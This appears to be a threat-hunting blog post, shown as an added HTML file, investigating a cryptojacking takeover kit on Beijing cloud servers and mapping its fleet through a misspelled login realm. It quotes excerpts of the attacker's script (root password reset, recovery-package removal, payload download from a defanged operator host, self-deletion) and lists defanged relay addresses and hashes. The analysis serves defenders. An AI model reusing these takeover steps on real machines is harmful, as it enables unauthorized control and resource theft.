@@ -1,0 +1,499 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>The Server That Said "pls input someting" — Ghost in the Bit</title>
+  <meta name="description" content="An open directory on a Beijing cloud was serving a cryptojacking takeover kit. I mapped a 27 server fleet from a single typo and a 17 node mining relay backbone from the deploy scripts, walking back four wrong conclusions along the way." />
+  <link rel="icon" type="image/x-icon" href="/images/favicons/favicon.ico" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicons/favicon-16x16.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicons/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="192x192" href="/images/favicons/favicon-192x192.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicons/apple-touch-icon.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  <meta name="theme-color" content="#0a0a0a" />
+  <link rel="stylesheet" href="/platform/styles/core.css" />
+  <style>
+    /* Report-specific additions, built from core.css tokens so it stays native */
+    .article figure { margin: var(--space-6) 0; }
+    .article figure img {
+      width: 100%;
+      border: 1px solid var(--border-soft);
+      border-radius: var(--radius-3);
+      background: var(--bg-2);
+    }
+    .article figcaption {
+      margin-top: var(--space-2);
+      font-size: 0.82rem;
+      color: var(--text-3);
+      text-align: center;
+    }
+    .key-list { list-style: none; padding: 0; margin: var(--space-4) 0; }
+    .key-list li {
+      position: relative;
+      padding: 10px 0 10px 22px;
+      border-bottom: 1px solid var(--border-soft);
+      color: var(--text-1);
+    }
+    .key-list li::before {
+      content: "";
+      position: absolute; left: 0; top: 17px;
+      width: 8px; height: 8px;
+      background: var(--accent);
+      transform: rotate(45deg);
+    }
+    .callout-note {
+      background: var(--bg-2);
+      border-left: 3px solid var(--accent);
+      border-radius: 0 var(--radius-2) var(--radius-2) 0;
+      padding: var(--space-3) var(--space-5);
+      margin: var(--space-5) 0;
+      color: var(--text-1);
+      font-size: 0.95rem;
+    }
+    .callout-note strong { color: var(--text-0); }
+    .ioc-block {
+      background: var(--code-bg);
+      border: 1px solid var(--code-border);
+      border-radius: var(--radius-3);
+      padding: var(--space-4) var(--space-5);
+      margin: var(--space-5) 0;
+      font-size: 0.85rem;
+    }
+    .ioc-block h4 { margin: 0 0 var(--space-2); color: var(--text-1); font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.04em; }
+    .ioc-block + .ioc-block { margin-top: calc(var(--space-5) * -0.4); }
+  </style>
+</head>
+<body>
+  <header class="site-header">
+    <a href="/" class="brand"><span class="brand-mark">◯</span><span class="brand-name">Ghost in the Bit</span></a>
+    <nav class="site-nav-inline" id="site-nav-inline"></nav>
+  </header>
+
+  <main class="article">
+    <header class="article-header">
+      <h1 class="article-title">The Server That Said "pls input someting"</h1>
+      <div class="article-meta">
+        <span class="category-pill">threat hunting</span>
+        <span class="category-pill">research</span>
+        <time datetime="2026 06 19">June 18, 2026</time>
+        <span>Threat hunting</span>
+        <span>22 min read</span>
+      </div>
+    </header>
+
+    <div class="callout-note">
+      <strong>Threat hunting is mostly patience and a refusal to fool yourself.</strong> As usual, I am not a malware reverse engineer by trade, and I will not pretend to be one. What I am good at is the part before the deep reversing, the part where you notice the one detail that does not belong, pull on it slowly, and refuse to tell a story bigger than your evidence. This hunt is the cleanest example I have, because the evidence kept handing me exciting conclusions and almost every one of them turned out to be wrong.
+    </div>
+
+    <p>
+      Like I usually do, I left every wrong turn in this writeup on purpose. The corrections are the real lesson, and I would rather show you how the work actually went than pretend I walked a straight line to the answer.
+    </p>
+
+    <h2>The short version</h2>
+    <ul class="key-list">
+      <li>One open directory on a Beijing cloud host was serving a full cryptojacking takeover kit. The miner was the easy part. The script wrapped around it changed the machine's locks, kept the key for itself, and erased itself on the way out.</li>
+      <li>The miner is commodity software that the feeds already know. The files that turned it into a takeover are not. None of the ten of them had ever been submitted anywhere I checked.</li>
+      <li>Four separate times I was sure I had found something big. Four times I had to take it back. Those four corrections are the most useful part of this report.</li>
+      <li>The fingerprint that finally held was a typo in a login prompt, <strong>pls input someting</strong>. It lines up 27 servers that all carry it exactly, and one of them is watching the rest.</li>
+      <li>A second layer of the operation, a backbone of 17 mining relays, only became visible because the deployment scripts hardcode it. Everything you can use, the queries, the hashes, and the infrastructure, is at the bottom.</li>
+    </ul>
+
+    <h2>How I got here</h2>
+    <p>
+      I was chasing command and control (C2) infrastructure, the usual Sliver and Ligolo servers, and getting nowhere, when a pivot dropped me onto a host I had no reason to care about. It was <code>101.126.33[.]186</code>, a Beijing box in Autonomous System (AS) 137718, which is Volcano Engine, ByteDance's cloud. Port 9999 was open, and Censys gave me a single label for it.
+    </p>
+
+    <pre><code>OPEN_DIRECTORY</code></pre>
+
+    <p>
+      Censys hangs that label on any host that answers a web request with a raw directory listing instead of a real page. Picture a workshop with the lights left on and the door standing open. Instead of a finished website you get the shelves themselves, with every tool sitting out on the bench where you can read the labels. Most of the time it is nothing, somebody's backups or a sloppy file share. Once in a while you walk in and the tools on the bench are meant for breaking into other people's machines.
+    </p>
+
+    <p>
+      This was the second kind. The shelves held <code>xmr</code> for Monero, <code>srbminer</code> and <code>xmrig</code> for the mining itself, <code>tari</code> and <code>nock</code> for more coins to dig, a 423 MB NVIDIA driver because miners are hungry for graphics cards, and a stack of <code>install_*.sh</code> scripts to bolt the whole thing together.
+    </p>
+
+    <pre><code>nock/  nock-proxy/  nockb2huoshan/  srbminer/  tari/  tencentnock/
+tool/  xmr/  xmrig-proxy/
+config.yaml
+install_cpu-auto-max-1-2-huoshan.sh
+nockb2huoshanullname.tar.gz
+tencent_cpu_auto_nullname_script.sh
+tencentnocknullname.tar.gz
+NVIDIA-Linux-x86_64-595.80.run</code></pre>
+
+    <p>
+      The directory timestamps ran from August 2025 to the week I found it, so this bench was in daily use. Nobody had walked away from it.
+    </p>
+
+    <p>
+      Here is where I almost made my first mistake, because mining by itself is not a crime. You can rent a server, mine Monero on it all day, and the only thing you owe is the power bill. A miner on a host tells you nothing on its own. The whole case comes down to one question I had not yet earned the right to answer. Was this someone mining their own machines, or someone mining yours?
+    </p>
+
+    <p>
+      The answer was never going to be in the miner. However, it was sitting in the wrapper around it, so I read the scripts.
+    </p>
+
+    <h2>Working safely, and a habit that saved the case</h2>
+    <p>
+      Before I touched a single file, I split the work across two machines, because the moment you run <code>curl</code> against an actor's server you have shaken their hand, and you want that handshake happening somewhere you can throw away. So the actor facing fetches all ran from a throwaway Linode with no credentials anywhere on it, using a hard timeout so a tarpit could not hang me.
+    </p>
+
+    <pre><code>curl -s -o "$out" --connect-timeout 10 --max-time 120 "$url"</code></pre>
+
+    <p>
+      The reputation lookups, the ones that needed my VirusTotal and MalwareBazaar keys, ran on a completely separate machine. The only thing that ever crossed between the two was plain hash text. That way the box holding my keys never reaches out to the operator, and the box reaching out to the operator never holds anything worth stealing.
+    </p>
+
+    <p>
+      Then I hashed every file and wrote the numbers down before I trusted any of them. That step sounds excessive until it saves you. When I came back to verify, four of the files returned at exactly 162 bytes, all sharing one hash. For a second that looks like the operator swapped them out from under me. However, 162 bytes is not a script. It is an nginx "404 Not Found" page, and my download had quietly saved that error message to disk under the filename I asked for. If I had hashed on autopilot, I would have reported four files changing that were never at that path to begin with. They had not moved. I had knocked on the wrong door. The guard against it is one line.
+    </p>
+
+    <pre><code># anything suspiciously tiny is a failed download, not a file
+find files -type f -size -300c -printf 'SUSPECT(&lt;300B): %p\n'</code></pre>
+
+    <p>
+      Call that mistake number zero, and I had not even reached the malware yet.
+    </p>
+
+    <h2>The smoking gun is twelve lines</h2>
+    <p>
+      Here is the heart of it, the orchestrator script <code>tencent_cpu_auto_nullname_script.sh</code>, with the noise stripped out.
+    </p>
+
+    <pre><code>dpkg -r reset-authentication                              # line 5
+echo root:'&lt;redacted — salted hash in IOCs&gt;' | chpasswd   # line 6
+./install_cpu-auto-max-1-2-huoshan.sh -p 1788 \
+   -u 'hxxp://115.190.140[.]175:9999/tencentnocknullname.tar.gz'   # line 10
+rm ./tencent_cpu_auto_nullname_script.sh                  # line 12</code></pre>
+
+    <p>
+      Its partner, <code>setup_ssh.sh</code>, pipes six actor Secure Shell (SSH) keys into root's <code>authorized_keys</code>, and the author even left a note to themselves in the margin, in Chinese, "在这里添加更多公钥," which means "add more public keys here."
+    </p>
+
+    <p>
+      One test cuts through all of it. Would the rightful owner of this machine ever do this to it? Walk the lines one at a time.
+    </p>
+
+    <p>
+      Line 6 pipes a fixed string into <code>chpasswd</code>, which quietly resets root's password to a value the actor picked. No one locks themselves out of their own house. Line 5 runs <code>dpkg -r</code> to remove a package named <code>reset-authentication</code>. Going by its name and its place in the sequence, that package is the cloud provider's own way to reset access on a locked out instance, the very tool the owner would reach for to undo line 6, and I want to be clear that I am reading that role from the name rather than from cracking the package open. The six injected keys are a second lock set on top of the first. Line 12 then deletes the script the instant it finishes. Installers do not erase themselves on the way out the door. Evidence does.
+    </p>
+
+    <p>
+      I read it twice to be sure, the password reset, the recovery package torn out right behind it, the quiet <code>rm</code> at the end, and the whole thing points in one direction only. Every move works against the owner and serves only someone who wants quiet control of a box that was never theirs. That is the moment a miner becomes a takeover that happens to mine. In MITRE ATT&amp;CK terms it is Persistence (T1098.004 and T1098), Impair Defenses (T1562), Indicator Removal (T1070.004), and Resource Hijacking (T1496), a four step takeover folded into twelve lines. The same script turns up under a second filename, <code>tc_menghen_bj_…</code>, with a byte for byte identical hash, which is the first hint that this is a template stamped out many times rather than a one off.
+    </p>
+
+    <h2>Four conclusions I reached and had to retract</h2>
+    <p>
+      Most writeups give you the clean version, where the author never stumbles and every step leads neatly to the next. That is not how this went. Four times the data lit up with a conclusion, and four times I had to put it back down. Those four moments are where the real work happened, and I have left every one of them in.
+    </p>
+
+    <h3>1. "The miner is novel." It's commodity.</h3>
+    <p>
+      All those unfamiliar binaries had me convinced I was looking at a brand new malware family, so I unpacked the bundle, pulled out the miner itself, <code>h9-miner-nock-linux-amd64</code>, and ran its hash past the feeds.
+    </p>
+
+    <pre><code>VT: malicious=9   label=miner.ltfzz   also seen as: k3kvq.exe</code></pre>
+
+    <p>
+      It came back known. It is a commodity HPool miner that anyone can download. That boring result turned out to be the important one, because it proved the two layers separate cleanly. The novelty was never going to live in the payload. However, when I ran all ten of the wrapper files past VirusTotal and MalwareBazaar, every single hash returned a flat not found, never even submitted. That is where the real novelty was hiding, and I would have walked right past it if I had planted my flag on the miner.
+    </p>
+
+    <p>
+      A file the feeds have never seen only means it is fresh. A known commodity can still be dangerous once you see what it is bundled with. You have to weigh the operation and the payload as two separate things.
+    </p>
+
+    <h3>2. "The miner hides its process." There's no hiding.</h3>
+    <p>
+      Half of these files wore the word <code>nullname</code> in their names, and I had already written "process hiding" in my own notes. It was sitting right there in the filenames, which is exactly why I went looking for the mechanism instead of trusting the label. A claim you have not tried to break is only a hope. So I grepped every script for the techniques a miner actually uses to hide a process, a bind mount over <code>/proc</code>, an <code>LD_PRELOAD</code> shim, a renamed process through <code>prctl</code> or <code>exec -a</code>, a detached session through <code>setsid</code>.
+    </p>
+
+    <pre><code>grep -nE 'mount --bind|/proc/[0-9]|LD_PRELOAD|prctl|PR_SET_NAME|exec -a|setsid' *.sh
+# (nothing)</code></pre>
+
+    <p>
+      Nothing. And the service that runs the miner, straight out of a configure script, is this.
+    </p>
+
+    <pre><code>systemctl restart miner.service</code></pre>
+
+    <p>
+      It is named <code>miner.service</code>, in plain sight, with no cloak and no trick. The word "nullname" was only ever a token in a filename. I struck the claim, and the finding got smaller and stronger at the same time, which is exactly what being right feels like. A filename is not evidence. You test the machinery and you ignore the label.
+    </p>
+
+    <h3>3. "I found a thousand victims." It's a stock image.</h3>
+    <p>
+      This is the one that nearly got me. I wanted a durable way to track the operator so badly I could taste it, so I pivoted on the one thing a fresh box almost never changes, its Secure Shell host key, betting the operator had reused a single golden image across the whole estate.
+    </p>
+
+    <pre><code>host.services.ssh.server_host_key.fingerprint_sha256="c079531c..."
+→ 13,736 results</code></pre>
+
+    <p>
+      For about three seconds, that is the find of a career, your pulse jumps and you start writing the headline in your head. However, then the discipline kicks in and turns the lights back on. An SSH host key is generated once, the first time the daemon starts on a fresh machine. If 13,736 machines all present the same one, it does not mean one crew owns them. It means they were all cloned from a single image whose key was baked in before that first boot and never regenerated, which is the unmistakable signature of a cheap cloud product sold by the thousand. The certificate told the same story when I checked the subject name.
+    </p>
+
+    <pre><code>host.services.cert.parsed.subject_dn: "CN=10_2_0_8"
+→ 97 results</code></pre>
+
+    <p>
+      That <code>CN=10_2_0_8</code> is just an internal address <code>10.2.0.8</code> flattened into a name, baked into a common Windows template and shared by 97 unrelated hosts. Both of those giant numbers were factory defaults. My "operator node" was one rented unit of a product that thousands of people run, so I cut it loose from the core. Finding a big number is easy. Knowing which big number to throw back is the whole skill.
+    </p>
+
+    <h3>4. "The body hash is the fingerprint." It's the whole internet's error page.</h3>
+    <p>
+      This one almost made it into the published draft, and a single query caught it on its way out the door. The operator's payload servers all answer with the same byte for byte <code>401 Unauthorized</code>, and Censys gives you two different hashes of that reply. The <code>banner_hash</code> covers the whole response, the status line and the headers and the body together. The <code>body_hash</code> covers only the returned page. They feel interchangeable, and out of habit I reached for the body hash.
+    </p>
+
+    <pre><code>host.services.endpoints.http.body_hash_sha256="2fb524c3..."
+→ 1,156 results</code></pre>
+
+    <p>
+      That returned 1,156 hosts spread across OVH, AWS, DigitalOcean, Hetzner, Russia, Germany, the United States, and Japan, the exact opposite of a tight Beijing fleet. The reason is the whole lesson packed into one stretch of bytes. The operator's typo lives up in the <code>WWW-Authenticate</code> header, but the page underneath it is the stock nginx 1.16.1 "401 Authorization Required" body that every nginx box on earth returns when it refuses a login. The body hash had matched the boilerplate and ignored the one part that was actually theirs. The fix was to hash the whole banner instead, headers included, which is the field that carries the typo. One word of difference, header instead of body, sits between a real fingerprint and a coin flip. As a small aside for anyone who works in Censys, the banner hash you want is <code>host.services.banner_hash_sha256</code> at the service level. The tidier looking <code>endpoints.http.banner_hash_sha256</code> does not exist and will just error on you. You hash the part the operator chose, and never the part the software ships for free.
+    </p>
+
+    <h2>The fingerprint was a typo</h2>
+    <p>
+      So where was the real signature hiding? In the dullest corner of the whole operation. When you hit one of the operator's payload servers, it does not hand you a file. It throws up a login box, and the realm string that labels that box is the signature.
+    </p>
+
+    <pre><code>WWW-Authenticate: Basic realm="pls input someting"</code></pre>
+
+    <p>
+      Misspelled, broken, and unmistakably the work of one person. An nginx basic auth prompt has no default text. The operator has to supply the realm string themselves, so the realm is always a deliberate choice, and a broken one repeated byte for byte across every box they built is the fingerprint of a single operator rather than a coincidence. So I searched the header directly. The query reaches into the parsed Hypertext Transfer Protocol (HTTP) headers and matches a key and value together, and the <code>:</code> here means a substring match, which is looser and more forgiving than the exact <code>=</code> I used on the hashes.
+    </p>
+
+    <pre><code>host.services.endpoints.http.headers:(key:"www_authenticate" and value:"pls input someting")
+→ 27 results</code></pre>
+
+    <p>
+      Twenty seven hosts came back, every one of them on Volcano Engine in Beijing, all on port 80, all answering with the same 401, confirmed on the full <code>banner_hash</code> and the same nginx 1.16.1. Two things turn this from a coincidence into a single operator. First, the realm is the operator's own invention. I searched the string against every nginx basic authentication tutorial I could find, and they all use something tidy like "Restricted Area" or "Administrator's Area." None of them use "pls input someting," so a broken phrase worn by 27 boxes is one operator's deliberate choice rather than a convention many people copy. Second, and this is the part that seals it, one of those 27 hosts, <code>115.190.140[.]175</code>, is named directly inside the malware. Line 10 of the orchestrator reaches out to <code>hxxp://115.190.140[.]175:9999/…tar.gz</code> for its payload. The realm is more than a resemblance. It is the front door of a server the malware physically downloads from. The scatter test backs it up, because 27 boxes sitting on one cloud in one city is not how a copied public config spreads.
+    </p>
+
+    <div class="callout-note">
+      <strong>One honest caveat while I am proud of this.</strong> The bond here is a deployment habit, not a cloned disk identifier. It holds because of that named link inside the script. The typo alone would not be enough.
+    </div>
+
+    <p>
+      Then the fleet handed me a thread. One of those hosts, <code>180.184.54[.]173</code>, was carrying a Domain Name System (DNS) name.
+    </p>
+
+    <pre><code>kuma.hd3p[.]com</code></pre>
+
+    <p>
+      <code>kuma</code> is Uptime Kuma, a self hosted status monitoring dashboard. The operator had stood up a monitor on its own domain and pointed it straight into the fleet, which is the kind of thing you only build for infrastructure you own and intend to babysit. It also surfaced a fresh operator domain, <code>hd3p[.]com</code>. I chased that domain with crt.sh, certspotter, and whois, all of which are public and safe to run from my main box, and the chase kept me honest as much as it paid off. The certificate transparency logs gave me a <code>pool.</code> host on <code>hd3p[.]com</code>, which fits a mining operation. However, whois told me <code>hd3p[.]com</code> does not share registration with the other operator domain <code>http33[.]com</code>. One was registered through Alibaba on DNSPod nameservers back in 2012, the other through Cloudflare in 2023 with the details redacted, and they share no certificates. So I tie the two domains together by how they are used rather than by a clean ownership record I cannot actually prove, and <code>hd3p[.]com</code>'s link to the fleet rests on the single name that lands inside it, <code>kuma.</code>. A dull error page, read closely, caught the whole fleet and handed me the next lead in the same breath.
+    </p>
+
+    <h2>Inside the kit: one template, stamped per victim</h2>
+    <p>
+      The <code>tool/</code> directory held two families of configure scripts, one per target, and reading both of them tells you exactly what the kit changes for each victim. It also handed me a layer of the operation I was never supposed to see.
+    </p>
+
+    <p>
+      The <code>api_*</code> scripts are the simple ones. Each stamps a single HPool mining key into the config and does almost nothing else.
+    </p>
+
+    <pre><code>NEW_API_KEY="nock0000-1811-****-****-************"
+sed -i "s/apiKey: \".*\"/apiKey: \"$NEW_API_KEY\"/" "$config_file"</code></pre>
+
+    <p>
+      A second one carries <code>nock0000-30c8-****-****-************</code>. Add the keys already sitting in the two cluster configs, and that is at least four separate HPool worker identities across the operation, one per batch. That is how you run it if you want clean books for each batch of victims and the ability to burn one identity without losing the rest. Those keys are a better thread to pull than any IP address, because they are the operator's own accounting.
+    </p>
+
+    <p>
+      The <code>croes_hs_*</code> and <code>croes_tc_*</code> scripts do something I had guessed wrong about. From the <code>nullname</code> naming I had assumed they were the evasion layer. They are not. They are a hardware tuner. Each one measures the box it landed on, works out how hard to run, and then points the miner at a relay chosen by that measurement.
+    </p>
+
+    <pre><code>cores=$(nproc)                                   # how many cores did we land on
+mem_gb=$(free -g | awk '/Mem:/ {print $2}')      # and how much memory
+# rewrite the pool address in the miner config to a relay chosen by core count
+sed -i "s/[0-9]\{1,3\}\(\.[0-9]\{1,3\}\)\{3\}:[0-9]\{1,5\}/$ip/g" "$config_file"
+sed -i "s/threads: [0-9]\+/threads: $cores/g"    "$config_file"
+systemctl restart miner.service</code></pre>
+
+    <p>
+      The selection is a plain <code>case</code> statement on the core count. A small two or four core box gets sent to one relay, a 96 core box gets sent to another, and the thread count is set to match so the miner works the hardware hard without falling over. It is load balancing for stolen compute. And because the relay for every machine size is written out in full, each script is carrying a hardcoded map of the operator's own relay layer, the same layer the open directory had already hinted at by shipping <code>nock-proxy/</code> and <code>xmrig-proxy/</code>.
+    </p>
+
+    <pre><code>115.190.151[.]9:9130   115.190.59[.]153:9117   115.190.121[.]176:9119  101.126.33[.]186:9121
+180.184.93[.]21:9122   115.190.52[.]227:9123   101.126.46[.]146:9124   115.190.152[.]207:9125
+101.126.28[.]214:9126  115.190.52[.]187:9127   115.190.117[.]189:9128  115.190.13[.]89:9129
+115.190.61[.]184:6105  115.190.127[.]193:6100  115.190.45[.]164:6102   115.190.62[.]231:9112
+101.126.88[.]4:9116</code></pre>
+
+    <p>
+      Seventeen Volcano Engine endpoints standing behind the fleet you can actually see. Three of them are worth more than the headcount.
+    </p>
+
+    <p>
+      The first is the anchor itself. <code>101.126.33[.]186</code>, the open directory I started from, shows up here as a relay on port 9121. The build bench is also production infrastructure.
+    </p>
+
+    <p>
+      The second ties the fleet to the mining backend by the operator's own hand. <code>115.190.62[.]231:9112</code> is hardcoded as a default upstream, and it is one of the 27 realm fleet hosts. That gives me three separate links between the fleet and the operation now, the named payload origin, this named relay, and the <code>kuma.</code> hostname, and each one is a different mechanism.
+    </p>
+
+    <p>
+      The third is a correction to one of my earlier corrections. <code>115.190.127[.]193</code> is the box I threw back over its shared Secure Shell key, and here the operator's own script names it as a default relay. Both things are true at once. The shared key told me how the box was built, and it never told me who was using it. It is operator infrastructure after all. I simply could not prove that from the key, and I was right not to try. The config is what settles it.
+    </p>
+
+    <p>
+      There was one more check to run, because an untested lead is not a finding. I put all 17 relays back through Censys to see whether those mining ports answer the open internet. Eleven of them were in the scan data at all, and not one exposed its relay port. Every visible host talks on web, database, or Remote Desktop Protocol (RDP) ports, while the mining ports stay silent the moment a scanner knocks, which is exactly what a relay firewalled to its own miners would do. So the backbone stays documented from the operator's config rather than from the outside, and it does not earn a tracking signature of its own. However, what the scan did show backs up ownership. The visible faces of these addresses are a SOCKS proxy on port 1080, a matched pair of identical Windows desktops, and a scattering of database and file sync services. That is the shape of an estate a crew stands up for itself.
+    </p>
+
+    <p>
+      So the per target layer changes two things, the mining identity and the relay assignment. None of these scripts touch <code>dpkg</code>, the cloud provider's agent, or the password. That logic lives upstream in the orchestrator and runs the same for every tenant. What the <code>croes_</code> layer adds is pure operations, which key you mine under and which relay you phone home to, tuned to whatever hardware it landed on.
+    </p>
+
+    <h2>What I am claiming, exactly</h2>
+    <p>
+      I want to be exact about what I am claiming, because restraint here is just accuracy, and accuracy is the whole product.
+    </p>
+
+    <p>
+      I have proven that <code>101.126.33[.]186</code> is a live, malicious takeover kit, shown from its own source, refetched and hash matched and read line by line. The malice is the four step chain, and it does not depend on the filenames.
+    </p>
+
+    <p>
+      I have proven that the operation's ten wrapper files are missing from every feed I checked, and that the only known artifact is the commodity miner. The novelty is the operation, and the payload is ordinary.
+    </p>
+
+    <p>
+      I am confident, within limits, about the fleet. The 27 hosts share a byte for byte identical login response, the same misspelled realm, on one provider in one region, and three of them are tied to the operation by separate mechanisms. One is the payload origin named in the orchestrator, <code>115.190.140[.]175</code>. One is a default relay named in a configure script, <code>115.190.62[.]231</code>. One carries a hostname on the operator's own domain, <code>kuma.hd3p[.]com</code>. The other 24 are high confidence members of the fleet, and I am not calling them individually proven victims. The realm proves shared deployment, and it does not prove identical disks, which is a weaker bond than a cloned machine identifier. I say so in the same breath that I show it.
+    </p>
+
+    <p>
+      I am inferring, and labeling it as inference, the exact role of the <code>reset-authentication</code> package.
+    </p>
+
+    <p>
+      I am not claiming the way in, a victim count, an operator's name, or any theft capability. This is resource hijacking and unauthorized control. It is not a wallet stealer, and I will not inflate it into one.
+    </p>
+
+    <h2>What you can use</h2>
+    <p>
+      Here is what you can take and run today. I have defanged the network indicators so nothing here is live.
+    </p>
+
+    <p>
+      Catch the next open directory mirror. Today this returns exactly one host, and it will fire the moment a second appears.
+    </p>
+
+    <pre><code>host.labels="OPEN_DIRECTORY" and host.services.endpoints.http.body:"tencent_cpu_auto_nullname_script.sh"</code></pre>
+
+    <p>
+      Catch the payload and staging fleet. Today this returns 27 hosts.
+    </p>
+
+    <pre><code>host.services.endpoints.http.headers:(key:"www_authenticate" and value:"pls input someting")
+host.services.banner_hash_sha256="030b359f9b123ea9617ff303c98ac7ba3c2084f1935f595004ddcf6cddc6d83a"</code></pre>
+
+    <p>
+      Do not pivot on the body hash. It is the stock nginx 401 page and it matches roughly 1,156 unrelated hosts around the world. The realm lives in the header, and only a header level match isolates the fleet.
+    </p>
+
+    <div class="ioc-block">
+      <h4>Infrastructure (defanged)</h4>
+      <pre><code>101.126.33[.]186          Volcano Engine / Beijing   open-dir build &amp; mirror (:9999) AND stratum proxy (:9121) — anchor, proven
+115.190.140[.]175         Volcano Engine / Beijing   payload origin, now locked behind the typo realm; also a fleet member
+115.190.127[.]193:6100    Volcano Engine / Beijing   operator stratum proxy (named in croes_tc_huojinglin); SSH host key is a commodity-image default — do not pivot on it
+115.190.62[.]231:9112     Volcano Engine / Beijing   stratum proxy (named in croes_tc_menghen) AND realm-fleet member
+upfile.obs.cn-east-3.myhuaweicloud[.]com/tool/setup_ssh.sh   Huawei OBS — SSH-key backdoor, still live
+49.232.236[.]216:9999     Tencent / Beijing          payload URL named in -h1 variant (role unconfirmed; no open :9999 now)
+hd3p[.]com                Alibaba/DNSPod reg., 2012   operator-linked: kuma.hd3p[.]com → 180.184.54[.]173 (fleet monitor), pool.hd3p[.]com (mining pool). NOT registration-linked to http33[.]com
+http33[.]com              Cloudflare reg., 2023       operator-linked (brand); separate registration from hd3p[.]com</code></pre>
+    </div>
+
+    <div class="ioc-block">
+      <h4>Stratum proxy backbone (from the configure scripts, all Volcano Engine, defanged)</h4>
+      <pre><code>115.190.151[.]9:9130   115.190.59[.]153:9117   115.190.121[.]176:9119  101.126.33[.]186:9121
+180.184.93[.]21:9122   115.190.52[.]227:9123   101.126.46[.]146:9124   115.190.152[.]207:9125
+101.126.28[.]214:9126  115.190.52[.]187:9127   115.190.117[.]189:9128  115.190.13[.]89:9129
+115.190.61[.]184:6105  115.190.127[.]193:6100  115.190.45[.]164:6102   115.190.62[.]231:9112
+101.126.88[.]4:9116
+
+(Plus the full 27 host "pls input someting" fleet in the indicator set.)</code></pre>
+    </div>
+
+    <div class="ioc-block">
+      <h4>Files (all wrapper files: not found on VT/MalwareBazaar at time of writing)</h4>
+      <pre><code>2c0e9c1c1837a7c8730f3a834dc6f2828cbeca63d92171e1b4ac3522107be93f  setup_ssh.sh                           six SSH-key backdoor + sshd hardening
+a49a709cb1cfae0c15457f16863c110bb33f36f6572d47bd907082472d3d1aa3  tencent_cpu_auto_nullname_script.sh    4-step kill chain (identical hash: tc_menghen_bj_… variant)
+d5d7c7c589ea9af9b191621c6011948041311b6ca40bf4ecae19073029e0b60e  install_cpu-auto-max-1-2-huoshan.sh    systemd miner installer
+f9b41a38… [full SHA256 pending]                                 install_cpu-auto-max-h1.sh             installer variant (references 49.232.236[.]216)
+6e72e5d8dc0564164cf53048e62ef13063684632d02087172c786b568bd2a4c0  install_cpu_monitor.sh                 watchdog
+3c275588… [full SHA256 pending]                                 croes_hs_all_configure_system.sh       per-tenant config writer (miner.service)
+8e9ef4b3… [full SHA256 pending]                                 one_shot_reboot_setup.sh               self-deleting one-shot reboot helper
+a2937c43f3d8aa902bebdad50663b7dff1e23075f4a8e4fd2900ee24841fc2b9  config.yaml                            HPool config schema (apiKey nock0000-…)
+257d3db4cfb5942f22c166f9139dcabfbc690bf05823278983d6916c7c65fe9f  nockb2huoshanullname.tar.gz            bundle (config + miner)
+c62a68830998b14613184e4746e7a0c3a21a7a96c856e3a8915df0adb9b018d3  tencentnocknullname.tar.gz             bundle (config + miner)
+4441e7f50a66cc9b678113284f3a19c8e3189c771902237d10df852c7a0c49d0  h9-miner-nock-linux-amd64              COMMODITY miner — VT malicious=9, miner.ltfzz</code></pre>
+    </div>
+
+    <div class="ioc-block">
+      <h4>Operator mining identities (HPool apiKeys, partially masked, one per deployment batch)</h4>
+      <pre><code>nock0000-7234-****-****-************   cluster config (Operation A)
+nock0000-672d-****-****-************   cluster config (related cluster)
+nock0000-1811-****-****-************   croes_api_1181  (baidu / xmyuzik tenant)
+nock0000-30c8-****-****-************   croes_api_30c8  tenant
+
+Masked after the batch group. The nock0000- prefix and the batch id are the
+trackable pattern; the full keys are held back from publication.</code></pre>
+    </div>
+
+    <p>
+      <strong>Backdoor credential</strong> (a detection signal, not loot). Rather than reprint a working root password, here is a salted SHA-256 of the value the malware sets, so a match can be confirmed without the live credential being republished. Salt <code>1457702e6f7f6cd1</code>, digest <code>fa5c49550c8806f21d8dcdbeafdd3194dc6c4bbbab1ce5a233eae61b38c859a2</code>, built as <code>sha256(salt + password)</code>. If you recover a candidate root password on a host, run <code>printf '%s' '1457702e6f7f6cd1&lt;candidate&gt;' | sha256sum</code> and compare. A host whose root password reproduces this digest is potentially compromised.
+    </p>
+
+    <p>
+      If you defend a network, block the mirror and the payload origins, watch for <code>dpkg -r reset-authentication</code> running on a host, and watch root's <code>authorized_keys</code> for keys that should not be there. Run the two Censys signatures above on a schedule. The miner is only the power bill. The twelve line wrapper is the actual incident.
+    </p>
+
+    <h2>The honest wrap up</h2>
+    <p>
+      I went looking for command and control infrastructure and once again walked away with a mining takeover kit. The kit is real, the backdoor is real, the 27 server fleet is real, the relay backbone behind it is real, and the typo that ties it together is exactly the kind of human slip that internet scan data exists to catch. The version of this report worth your trust, though, is the one that kept all four of my wrong turns in it. I read a commodity miner as a new family. I believed in process hiding that was never there. I was handed 13,736 hosts that were really a factory default, and a body hash that was really the whole internet's error page.
+    </p>
+
+    <p>
+      None of those was a failure. Every one of them was the data showing me where the floor was not, and the finding only stands as firmly as it does because I stopped each time and looked again. I learned a long time ago, in a much harder classroom, that the fastest way to get hurt is to grow comfortable and stop checking your surroundings. The same thing is true in this work. The exciting answer is usually the one most likely to be wrong, and the willingness to set it down and look again is what separates a guess from a finding. That habit travels with me into any problem and any team, and it is the part of this work I am proudest of.
+    </p>
+
+    <div class="callout-note">
+      <strong>Sources and methodology.</strong> Infrastructure and certificate analysis via the Censys Platform. Hash reputation via VirusTotal and MalwareBazaar. Domain work via crt.sh, certspotter, and whois. Script analysis is static, read from operator files that I refetched and hash verified on an isolated host kept apart from anything holding credentials. The network indicators are defanged. Any credentials or keys I recovered are written down here as indicators only, and I never used them against any system.
+    </div>
+
+    <div class="newsletter-cta inline">
+      <h2 class="newsletter-cta-heading">Liked this?</h2>
+      <p class="newsletter-cta-sub">
+        I write one of these a month. Drop your email below to get new posts
+        and research in your inbox. No spam.
+      </p>
+      <form
+        action="https://buttondown.com/api/emails/embed-subscribe/ghostinthebit"
+        method="post"
+        class="embeddable-buttondown-form"
+        target="popupwindow"
+      >
+        <label for="bd-email">Enter your email</label>
+        <input type="email" name="email" id="bd-email" placeholder="your@email.com" required />
+        <input type="submit" value="Subscribe" />
